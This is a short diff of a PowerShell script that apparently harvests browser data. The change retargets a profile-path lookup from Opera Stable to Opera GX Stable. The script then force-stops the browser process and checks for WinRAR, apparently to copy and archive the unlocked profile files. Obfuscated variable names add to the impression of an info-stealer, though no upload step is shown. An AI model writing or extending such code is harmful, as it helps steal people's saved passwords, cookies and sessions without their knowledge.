@@ -58,7 +58,7 @@ if(Test-Path -Path $o){
 }
 else{echo "Oasd";$e=$e+'Oasd'}
 
-$og=($env:APPDATA+"\Opera Software\Opera Stable\");
+$og=($env:APPDATA+"\Opera Software\Opera GX Stable\");
 if(Test-Path -Path $og){
   Stop-Process -Name browser -ErrorAction SilentlyContinue;
   if("WinRAR" -in $arh)
